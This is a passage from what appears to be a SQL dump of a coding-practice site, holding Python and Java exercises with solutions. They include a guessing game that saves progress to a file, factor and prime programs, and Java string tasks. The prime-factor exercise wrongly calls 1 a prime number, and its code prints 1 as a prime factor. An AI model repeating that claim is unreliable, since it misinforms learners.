#add the point scored in this stage into the list</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            points_scored.append(points[counter])</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            level = level + 1</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            break</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        elif guess_number &lt; secret_number:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is lower than secret number\")</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        else:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is higher than secret number\")</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    else:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Game Over, You Loose the Game, secret number is {}\".format(secret_number))</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        break</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">else:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Congratz, You Won the Game with {} !!!\".format(sum(points_scored)))</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    #loop to display scored points in every stage</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    for i in range(0,3):</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"level {} points {}\".format(i+1, points_scored[i])) \'\'\'</span></div></div>',NULL,'<p>Logic is same as<a href=\"https://www.decodeschool.com/python-logic-building/python-program-for-guessing-game/guessing-game-in-python-level-4\" target=\"_blank\"> level 4</a>, in addition,</p><p>points are stored using list</p><p>points_scored variable is a list which stores the points scored by user at each stage</p><p>the final for loop shows the points scored by user at each stage.</p>',27,NULL,NULL,NULL),(1069,'Complete Guessing Game with Non-Volatile Storage in Python','guessing-game-in-python-level-7','<div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">\"Multi Stage Guessing Game and File Storage to store current level\"</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">Create a three stage guessing game which stores current stage of user in hard disk, in each stage the user must guess the secret number in five attempts. Range of Secret number should be increased at stage like 1 to 10 in stage in 1, 1 to 20 in stage 2 and 1 to 30 in stage 3. If the user correctly guessed the secret number, the system should display \"your guess is correct\" and moves to next stage; otherwise, it should tell the user whether the guessed number is higher or lower than the secret number and proceed to the next attempt. If the user fails to guess correctly after five attempts, the game should end with the message \"Game Over, You Lose the Game.\" If user successfully&nbsp;guessed in all the three stages, display \"You won the Game with scored points\", then points scored at each level and stops the game.</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">Note : If user lefts or stops the game after completing any stage, it should starts from next stage when user runs the program again.</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">At each stage the points will be awarded to user based on following condition</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><table class=\"table table-bordered\" style=\"width: 681px; margin-bottom: 1rem; color: rgb(41, 41, 41); border-color: rgb(169, 169, 169); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px; background-color: rgb(255, 255, 255);\"><tbody><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">Solved in&nbsp;</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">points</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">first attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">100</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">second attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">75</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">third attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">50</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">fourth attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">25</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">fifth attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">10</td></tr></tbody></table><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Permanent&nbsp; storage (File) is needed for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the usage of Files</div>','B','<div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; line-height: 19px; white-space: pre;\"><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#os package for remove files at last</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">import os</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#sequence type to store points</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">points = [100,75,50,25,10]</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#Open the file and check for next stage</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">f = open(\'guess.txt\',\'a+\')</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">f.seek(0,0)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">content = f.read()</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#check whether user completed any stage(s) already</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">if content != \"\":</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;#split level and points at each level<br></span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    level,points_content = content.split(\":\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    level = int(level)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;#store points of each level<br></span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    points_scored = list(map(int,points_content.rstrip(\',\').split(\",\")))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">else: #if no stage(s) completed</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    level = 1</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    points_scored = list()</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">f.close()</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#loop for 3stages</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">while level &lt;= 3:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #complexity range for each stage</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    end_value = level * 10</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #secret number generation</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    secret_number = randint(1,end_value)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #looping statment for 5 attempts at each stage</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    for counter in range(0,5):</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        #gets the guessing number as user input</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        guess_number = int(input(\"Guess the secret number between 1 and {} ({} attempts left):\".format(end_value,5-counter)))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        #check guessing number is correct or higher or lower</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        if secret_number == guess_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is Correct, You Won the level {} with {} points\".format(level,points[counter]))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            points_scored.append(points[counter])</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            level = level + 1</span></div><span style=\"background-color: rgb(255, 255, 255);\"><br></span><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            #write the current level to file</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            content = str(level) + \":\"</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            for p in points_scored:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">                content += str(p) + \",\"</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            f = open(\'guess.txt\',\'w\')</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            f.write(content)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            f.close()</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            break</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        elif guess_number &lt; secret_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is lower than secret number\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is higher than secret number\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Game Over, You Loose the Game, secret number is {}\".format(secret_number))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        #remove if user lose the game</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        os.remove(\'guess.txt\')</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        break</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Congratz, You Won the Game with {} !!!\".format(sum(points_scored)))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    for i in range(0,3):</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"level {} points {}\".format(i+1, points_scored[i]))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #remove if user wins the game</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    os.remove(\'guess.txt\')</span></div></div>',NULL,'<p>Watch <a href=\"https://www.decodeschool.com/python-logic-building/python-program-for-guessing-game\" target=\"_blank\">Previous levels</a> for the guessing game logic, in addition&nbsp;</p><p>to store the level and points scored by user in hard disk we are using text file \'guess.txt.,</p><p>note:</p><p>split(\':\') split the string into list, colon (:) is the separator here</p><p>rstrip(\',\') removes comma(,) at the end of the string</p><p>open(), read(), seek(), write(), and close() are the file functions.</p><p>seek(0,0) moves the file pointer to beginning of the file.</p><p>open(\'guess.txt\',\'a+\') opens file in append mode (write without delete) and read mode.</p>',27,NULL,NULL,NULL),(1070,'Factors of given number in Python','factors-of-given-number-in-python','<p>Write a Program to get a number n and to find the factors of n. Generally factors are the number which divides the number n.</p><p>Sample Input:</p><p>24</p><p>Sample Output:</p><p>1</p><p>2</p><p>3</p><p>4</p><p>6</p><p>12</p><p>24</p>','B','<p>#Program to Find Factors of Given number n</p><p>n = int(input(\"Enter a Number:\")) #get input n</p><p><br></p><p>#checks which are the numbers from 1 to n/2 divides n.</p><p>#No other after n/2 divides n except n</p><p>for i in range(1,n//2+1):</p><p>&nbsp; &nbsp; if n % i == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print(i)</p><p>#print n because every number is divisible by the same number</p><p>print(n)</p>',NULL,'<p>input() gets the value of n from users as string, and int() coverts the same to integer.&nbsp;</p><p>The following for loop iterates from i = 1 to n/2, in each iteration it checks whether the n is divisible by i.</p><p>if i divides n then print i. No other number after n/2 divides n except n.</p><p>Print n at last because every number is divisible by the same number</p>',28,'','raptor/factor_of_number.png','factors_lEemaPf.jpg'),(1071,'Prime Number Program in Python','prime-number-program-in-python','<p>Write a Program to get a number n and to find whether n is prime number or not. Generally Prime number is a number which cannot be divisible by any whole numbers except 1 and n.</p><p>Sample Input 1:</p><p>9</p><p>Sample Output 1:</p><p>Not a Prime Number</p><p>Sample Input 2:</p><p>11</p><p>Sample Output 2:</p><p>Prime Number</p><p>Note :&nbsp;</p><p>9 is divisible by 3</p><p>11 is only divisible by 1 and 11.</p><p><br></p>','B','<p>#Python Program to find whether given number is Prime or Not</p><p>n = int(input(\"Enter a Number:\")) #get input n</p><p><br></p><p>#check which are the numbers from 2 to n/2 divides n.</p><p>#No other after n/2 divides n except n</p><p>for i in range(2,n//2+1):</p><p>&nbsp; &nbsp; if n % i == 0: #if divisible then it is not prime.</p><p>&nbsp; &nbsp; &nbsp; &nbsp; print(\"It is Not a Prime Number\")</p><p>&nbsp; &nbsp; &nbsp; &nbsp; break</p><p>else: #this is else of for&nbsp; statement. executes after last iteration if loop is not broken at any iteration.</p><p>&nbsp; &nbsp; print(\"It is a Prime Number\")</p>',NULL,'<p style=\"margin-bottom: 1rem; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">input() gets the value of n from users as string, and int() coverts the same to integer.&nbsp;</p><p style=\"margin-bottom: 1rem; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px;\">The following for loop iterates from i = 1 to n/2, in each iteration it checks whether the n is divisible by i.</span><br></p><p style=\"margin-bottom: 1rem; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">if i divides n then print \"It is Not a Prime\" and exit the loop through break statement. No other number after n/2 divides n except n.</p><p style=\"margin-bottom: 1rem; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Print \"It is a Prime Number\" after last iteration if loop iteration was not broken at any iteration.</p>',28,'','',''),(1072,'Python Program for Prime numbers between two numbers','python-program-for-prime-numbers-between-two-numbers','<p>Get two inputs x and y and print all the prime numbers between x and y.</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">Sample Input 1 :</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">10 40</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">Sample Output 1 :</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify; line-height: 1;\">11 13 17 19 23 29 31 37</p>','B','<p>#Python Program to print prime numbers between x and y</p><p>x = int(input(\"Enter a Number X:\")) #get input x<br></p><p>y = int(input(\"Enter a Number Y:\")) #get input y</p><p>#start your travel from x to y<br></p><p>for n in range(x,y+1):</p><p>#check which are the numbers from 2 to n/2 divides n.<br></p><p>#No other after n/2 divides n except n<br></p><p><br></p><p>&nbsp; &nbsp; for i in range(2,n//2+1):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if n % i == 0: #if divisible then it is not prime.<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br></p><p>&nbsp; &nbsp; else: #this is else of for&nbsp; statement. executes after last iteration if loop is not broken at any iteration.<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; print(\"{} \".format(n))<br></p>',NULL,'<p>Prime numbers are numbers those only divisible by 1 and same. using a outer for loop we check take every number n from x to y&nbsp;</p><p>Inner for loop checks each number is prime or not, if prime it prints the&nbsp; n.</p>',28,'','',NULL),(1073,'Prime Factor Program in Python','prime-factor-program-in-python','<p>Get a number x and find the prime factors of x.</p><p>Sample Input 1:</p><p>24</p><p>Sample Output 1:</p><p>1&lt;br&gt;</p><p>2&lt;br&gt;</p><p>3</p><p>Note:</p><p>1 2 3 4 6 8 12 are the factors of 24. &lt;br&gt;</p><p>1, 2 and 3 are the Prime numbers in above factors.</p><p><br></p>','B','<p>#Program to Find Prime Factors of Given number n<br>n = int(input(\"Enter a Number:\")) #get input n<br>#checks which are the numbers from 1 to n/2 divides n.<br>#No other after n/2 divides n except n<br>for i in range(1,n//2+1):<br>&nbsp; &nbsp; if n % i == 0: # if divisible then it a factor<br>&nbsp; &nbsp; &nbsp; &nbsp; #Check Factor is Prime<br>&nbsp; &nbsp; &nbsp; &nbsp; for j in range(2,i//2+1):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if i%j == 0: #if divisible not a prime<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br>&nbsp; &nbsp; &nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(i) #print the prime factor</p>',NULL,'<p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">input() gets the value of n from users as string, and int() coverts the same to integer.&nbsp;</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><span style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start;\">The following for loop iterates from i = 1 to at n/2, in each iteration it checks whether the n is divisible by i.</span><br></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">No other number after n/2 divides n except n.<br></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">if i divides n then check whether i is prime or not. if i is prime print i.</p>',28,'','',''),(1075,'Java Program to Print the English Alphabets In Lower Case','java-program-to-print-the-english-alphabets-in-lower-case-2gcz','<p>Write a java Program to print the following output:\r\n</p><p>Output:\r\n</p><p>\r\na b c d e f g h I j k l m n o p q r s t u v w x y z</p>','B','','prog/java/All.java','',24,'','',''),(1076,'Java Program to Print the English Alphabets In Lower Case','java-program-to-print-the-english-alphabets-in-lower-case-g8ra','<p>Write a java Program to print the following output:\r\n</p><p>Output:\r\n</p><p>\r\nA B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>','B','','prog/java/Alu.java','',24,'','',''),(1077,'Addition of Matrix in Java','addition-of-matrix-in-java','Get two Matrices A and B and Perform Addition of Two Matrices\n','B',NULL,'prog/java/AM.java',NULL,25,'','',''),(1078,'Java Program to Count The Occurences Of Character In a String','java-program-to-count-the-occurences-of-character-in-a-string','<p>Get a String and a character then count the occurrence of character in the string.\r\n</p><p>Sample Input 1:\r\n</p><p>Hello\r\n</p><p>l\r\n</p><p>Sample Output 1:\r\n</p><p>2</p>','B','','prog/java/CC.java','',29,'','',''),(1079,'Java Program to Print the Character of given ASCII Value','java-program-to-print-the-character-of-given-ascii-value','<p>Get a ASCII value from user (0 to 255) and display the corresponding character</p><p>\r\n\r\nSample Input 1:\r\n</p><p>\r\n75\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nK\r\n</p><p>\r\nSample Input 2:\r\n</p><p>\r\n97\r\n</p><p>\r\nSample Output 2:\r\n</p><p>\r\na</p>','B','','prog/java/Charac.java','<p>converting an integer to character using (char) returns the ascii value of the number.</p>',21,'','',''),(1080,'Java Program to Compare two Strings are Equal','java-program-to-compare-two-strings-are-equal','<p>Get two strings and check whether both are equal</p><p>\r\n\r\nSample Input 1:\r\n</p><p>\r\nMARK\r\nMAKE</p><p>\r\n\r\nSample Output 1:</p><p>\r\n\r\nNot Equal</p>','B','','prog/java/Com.java','',29,'','',''),(1081,'Java Program to Concatenate two Strings','java-program-to-concatenate-two-strings','<p>Get two strings and join them as a single string.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>MARK\r\nMAKE\r\n</p><p>Sample Output 1:\r\n</p><p>MARKMAKE</p>','B','','prog/java/Conc.java','',29,'','',''),(1082,'Java Program to delete an Element from the Array','java-program-to-delete-an-element-from-the-array','<p>Sample Input 1:\r\n</p><p>\r\n5</p><p>  5 7 9 3 1  \r\n9\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n5 7 3 1</p>','B','','prog/java/Del.java','',25,'','',''),(1083,'Java Program to Calculate Different Discounts to Bill Amount','java-program-to-calculate-different-discounts-to-bill-amount','<p>Get price and quantity of a product, calculate bill amount, calculate 10% discount for the bill amount 5000 and above, 5% discount for the bill amount 1000 and above.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n10 400\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n3800\r\n</p><p>\r\nSample Input 2:\r\n</p><p>\r\n10 500\r\n</p><p>\r\nSample Output 2:\r\n</p><p>\r\n4500</p>','B','','prog/java/Dis.java','',23,'','raptor/discount.PNG',''),(1084,'Java Program to Count the Occurences of Sub String','java-program-to-count-the-occurences-of-sub-string','<p>Get a String and Substring and count the occurrence of substring in string.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nentertainment </p><p>\r\nen\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n2</p>','B','','prog/java/Ex.java','',29,'','',''),(1085,'Java Program to find Exponentiation','java-program-to-find-exponentiation','<p>Get two inputs num1 and num2, compute the exponentiation of base num1 and power num2 without using predefined functions\r\n</p><p>Sample Input 1:\r\n</p><p>2 4\r\n</p><p>Sample Output 1:\r\n</p><p>16</p>','B','','prog/java/Exp.java','',24,'','',''),(1086,'Java Program to find the index of character in a String','java-program-to-find-the-index-of-character-in-a-string','<p>Get a String and a character then find where the character occurred first in the string.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello l</p><p>\r\n\r\nSample Output:</p><p>\r\n\r\n2</p>','B','','prog/java/Lc.java','',29,'','',''),(1087,'Java Program to find whether Leap Year or Not Leap Year','java-program-to-find-whether-leap-year-or-not-leap-year','<p>Get a year and check whether year is leap year or not.\r\n</p><p>\r\nsample Input 1:\r\n</p><p>\r\n2016\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nLeap year\r\n</p><p>\r\nSample Input 